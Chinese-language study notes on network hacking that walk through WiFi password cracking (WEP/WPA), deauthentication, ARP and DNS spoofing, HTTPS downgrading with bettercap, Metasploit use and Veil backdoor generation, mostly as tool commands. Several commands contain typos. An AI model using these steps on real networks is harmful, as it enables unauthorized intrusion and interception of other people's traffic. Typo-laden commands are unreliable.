# Linux加資安學習筆記

## 第一部份：(Network hacking)
### 1.訪問過程：
>所有網路都是為了訪問互聯網，而不論WIFI還是有線網路，所有裝置都要透過一個接入點進入，稱為路由器，即使連上網路，沒有透過路由器仍不能取得資源。
>
>![](https://i.imgur.com/f5QIyL7.png)
>(意象圖)

### 2.無線路由器
>路由器：其主要功能是連接網路

### 3.網路指令
```
$ ifconfig : 顯示所有網路接口
```
>執行後可以看到eth0,lo，eth0是虛擬機建立的乙太網路接口，lo則是linux使用的虛擬網路接口，觀察有沒有IP位址來判斷有沒有連上網路。
額外：wlan0是外接無線路由器的網路接口

### 4.Mac Address
>概念：類似身分證，辨別裝置，確保訊息傳遞的位址正確，每個裝置都只有一個Mac Address
>使用時機：為了在網路上匿名，或者模擬其他設備以獲得訪問權，
>（更改Mac Address步驟）
```
$ ifconfig wlan0 down
$ ifcongig wlan0 hw ether 00:11:22:33:44:55
$ ifconfig up
```
### 5.監控模式
>因為一個裝置只有一個Mac Address，所以也只能一個個請求資源，但切換到監控模式下可以觀測連接到路由器的所有數據（WIFI封包）。
（切換方式）
```
$ ifconfig wlan0 down
$ airmon-ng check kill #斷網
$ iwconfig wlan0 mode monitor
$ ifconfig wlan0 up
$ iwconfig #顯示所有無線設備
```
### 6.觀察網路資訊
```
$ airodump-ng mon0
```
### 7.觀察某一指定網路
```
$ airodump-ng --bssid (目標網路bssid) --channe (目標網路channel) (--write text) mon0
```
### 8.wireshark
>開啟可以觀察上一步儲存的文件資訊，打開.cap，其中bssid是網路mac address，station則是裝置mac address
```
$ wireshark
```
### 9.預連接攻擊
>透過更改mac address假裝是某個客戶端，向路由器請求斷開連接，之後再更改mac address假裝路由器，並向客戶端請求中斷。
```
$ aireplay--deauth (時間) -a (bssid) -c (station) mon0
```
>接著split另一個終端同時執行觀測某一網路(極少數情況需要同時執行)
```
$ airodump-ng --bssid (目標網路bssid) --channe (目標網路channel) mon0
```
>這次不write文件
### 10.WEP
>WEP是使用RCS算法加密，加密比較簡單也比較好破解
>![](https://i.imgur.com/acb1sKC.png)
>先執行第七步驟
```
$ airodump-ng --bssid (目標網路bssid) --channe (目標網路channel) --write basic mon0
```
>(接下來分成兩種狀況)
>一種是網路未閒置，執行以下分析網路程式
```
$ aircrack-ng basic-01.cap mon0
```
>basic-01這部份，write檔名可以任意，預設會給01，解析cap檔，得到的結果會是00:11:22:33:44:55格式，去掉冒號後就是密碼。
>
>第二種是，網路閒置，需要先與網路建立關聯，一般狀況，網路會自動屏蔽未連接而沒提供密碼的詢問，執行以下程式，其中mac address是bssid，此種叫做ARP攻擊
```
$ aireplay-ng --fakeauth 0 -a (目標網路mac address) -h (unspec) mon0 #unspec的-要改:
```
>同時執行，ifconfig得到的unspec前12位數字放入上面，要把-改成 :，其中unspec是ether，只是在monitor模式下是unspec，這樣就成功建立了關聯。
```
$ aireply-ng --arpreply -b (目標網路mac) -h (unspec) mon0
```
>ARP攻擊：因為不夠數據，所以要不斷的向伺服器發送請求讓網路產生新的IV
### 11. WPA/WPA2
>也是一種網路加密，比WEP更難破解，有兩種攻擊方式
```
$ aireplay-ng --fakeauth 30 -a (目標網路mac address) -h (uspec前12碼) wlan0
```
上述指令是製造關聯
```
$ wash --interface wlan0
```
這個指令可以快速看到接口連接的網路
```
$ reaver --bssid (目標網路mac address) --channel (ch) -interface wlan0 -vvv -no-associate
```
上述為暴力破解指令
>通常情況下，商數方式並沒有辦法真的破解network passwd，我們需要使用以下方法
```
$ airodump-ng wlan0
```
執行後可以看到查看router觀測的網路資訊
```
$ airodump-ng --bssid (bssid) --ch (ch) (--write text) wlan0
```
上面這段指令是用來捕捉handshake
### 進階WPA2
```
$ crunch (number) (number) | aircrack-ng -b (bssid) -w - (handshake)
```
執行上述可以在不佔用儲存的情況下建立wordlist並破解handshake
```
$ crunch (number) (number) | john --stdin --session=session1 --stdout | aircrack-ng -b (bssid) -w - (handshake)
```
與上述指令一樣，只是多了儲存進度
```
$ crunch (number) (number) | john --stdin --restore=session1 --stdout | aircrack-ng -b (bssid) -w - (handshake)
```
在剛剛儲存的進度下繼續執行
### 12. 連接後攻擊-資訊收集
```
$ ifconfig
```
執行後可以看到inet，是ip位址，得到ip位址後執行以下
```
$ netdiscover -r (router ip 位址)/24 
```
執行後可以看到ip位址連接到的網路的同個裝置，結尾要加上/24，原因是因為子網路遮罩為255.255.255.0，路由器分配的只有最後一個ip數有變動，範圍都是1~255
```
$ zenmap
```
>在target可以搜尋目標網路的資訊(可以連接上的)，就等於是有GUI的namp，各個功能可以實際去嘗試加上體驗，這邊介紹一些普通的。
>ping scan : 可以ping各個連接到同個網路的裝置資訊，這邊要注意，不是所有裝置都會回應ping
>Quick scan : 跟上面的方式很像，這次會顯示更多資訊，而且它會顯示裝置開放的端口，執行也比較慢
>Quick scan plus : quick scan的進階，顯示更多資訊，可以看到裝置的type, os, 以及在端口運行的程式版本，如果有一部ios手機越獄，他會自動安裝ssh服務，並且他的密碼會是alpine
### 13.連接後攻擊-MITM攻擊
![](https://i.imgur.com/pJXDIT8.jpg)
>ARP中毒，駭客可以當中間人，監聽裝置給router的訊息，這邊還有注意事項，同個網路下溝通是透過mac address而不是ip
>
ARP溝通
>某個裝置像其他所有裝置詢問ip，正確的裝置會回傳ip與mac address，整體運作圖如下
![](https://i.imgur.com/fhwuAtj.jpg)
![](https://i.imgur.com/DMVUute.jpg)

ARP欺騙
![](https://i.imgur.com/jJEXHch.jpg)

ARP欺騙指令(此噌可以在mac or windows執行)
```
arp -a
```
>可以查看router ip
實作指令欺騙裝置讓他以為我是router

實作指令欺騙裝置
```
$ arpspoof -i eht0 -t (spoofing device ip) (router ip)
```
實作指令欺騙路由器
```
$ arpspoof -i eth0 -t (router ip) (spoofing device ip)
```
>注意以上指令需要同時執行

指令讓被欺騙的裝置可以透過我的kali將被spoofing device的data傳到router，預設會擋下
```
$ echo 1 >proc/sys/net/ipv4/ip_forward
```
ARP欺騙吧第二種指令
```
$ bettercap -iface eth0 
```
>開啟該工具
```
$ net.probe on
```
>會搜索同個網路下的客戶端
```
$ net.show
```
>觀看上面指令執行後找到的客戶端

修改選項
```
set (options) true
```
找尋使用模塊的指令
```
help (model)
```
>如果只用help可以顯示出已啟用model及可用model

實例(arp spoofing)
```
set arp.spoof.duplex true
```
>同時多工
```
set arp.spoof.target (be spoofed device mac address)
```
```
arp.spoof on
```
>以上是ARP spoofing
```
net.sinff on
```
>所有經過電腦的資訊會被捕捉與分析，但是無法繞過https
關於http與https部分可以去參考我的basic networ的meida

繞過https
```
set net.sniff local true
```
>因為bettercap會認為我是linux主機給的密碼，所以不會顯示在螢幕上

caplets tools
```
caplets.show
```
>列出可以執行的caplet
```
hstshijack/hstshijack
```
>可以把它從https降級成http

繞過hsts，由facebook, twitter等使用
>因為hsts會從頭到尾執行https，並無法降級，所以只能變更域名，讓他變成http的網站
```
要安裝文件hstshijack
```

DNS spoofing (hsts不適用)
>DNS : 將域名轉成ip
```
service apache2 start
```
>開啟網頁sever，網頁會在/var/www/html
```
set dns.spoof.all true
```
>開啟所有dns嗅探
```
set dns.spoof.domain (要被導向的網站ip或域名)*(前面的子網域或其他網域)
```
>這邊可將網站導成我們的ip address上的apache2建立的website sever
```
dns.spoof on
```

JS 注入
>建立一個js檔，打開hstshijack.cap，在payload最後加上,*:(js檔)

bettercap interface
```
bettercap -iface eth0
```
>開啟bettercap
```
httpd-ui
```
>開啟interface
```
ui.update
```
>如果不能執行可以先安裝，開啟後，默認帳號名是user，默認密碼是pass

wireshark
>只能用於監聽與分析自己裝置接口的數據，一般來說並不能用於hack attack但是我們使用arp spoofing，因此可以監聽其他裝置的資訊

### Sever side attack
>使用zenmap觀看開放端口，可以看到21(FTP), 512(RSH)等
```
apt-get install rsh-client
```
rsh連線
```
rlogin -l (user) (target ip)
```
漏洞查找過後再google上搜，範例找到此漏洞
```
msfconsole
```
查看服務
```
show options
```
設定
```
set RHOST (ip)
```
執行
```
exploit
```
備注：sever attrack未完，重看

### client side attack
補：更改文件權限
```
chmod +x (filename)
```
veil github : https://github.com/Veil-Framework/Veil
veil工具，下載後
```
veil
```
執行後可以查看功能
```
list
```
產生不可檢測的後門
```
use 1
```
>1 Evasion : 產生payload
>2 Ordnace : 